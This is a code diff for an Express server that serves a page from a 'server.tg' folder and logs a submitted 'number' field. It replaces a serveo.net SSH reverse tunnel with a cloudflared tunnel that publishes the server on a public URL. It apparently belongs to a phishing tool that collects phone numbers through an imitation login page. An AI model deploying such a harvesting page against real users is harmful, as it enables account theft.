@@ -36,6 +36,10 @@ console.log(formattedData.yellow.bold);
 res.sendFile(__dirname + '/server.tg/index.html');
 });
 
+app.get('/tunnel-url', (req, res) => {
+  res.json({ url: tunnelUrl });
+});
+
 app.post('/data', (req, res) => {
 const logData = {
 number: req.body.number,
@@ -73,11 +77,20 @@ app.get('/ico', (req, res) => {
 res.sendFile(path.join(__dirname, 'server.tg', 'favicon.ico'))
 });
 
-app.listen(port, host, () => {
-console.log(`[+] Server Running in PORT =>`.white.bold +` ${port}`.yellow.bold);
-    const sshProcess = spawn('ssh', ['-R', '80:localhost:4040', 'serveo.net'], { stdio: 'inherit' });
+app.listen(port, () => {
+  console.log(`[+] Server running on http://localhost:${port}`);
 
-    sshProcess.on('close', (code) => {
-        console.log(` SSH code ${code}`);   
- });
-})
+  const cloudflared = spawn('cloudflared', ['tunnel', '--url', `http://localhost:${port}`]);
+
+  const parseUrl = (data) => {
+    const text = data.toString();
+    const match = text.match(/https:\/\/.*trycloudflare\.com/);
+    if (match) {
+      tunnelUrl = match[0];
+      console.log(`[+] Cloudflare Tunnel: ${tunnelUrl}`);
+    }
+  };
+
+  cloudflared.stdout.on('data', parseUrl);
+  cloudflared.stderr.on('data', parseUrl);
+});
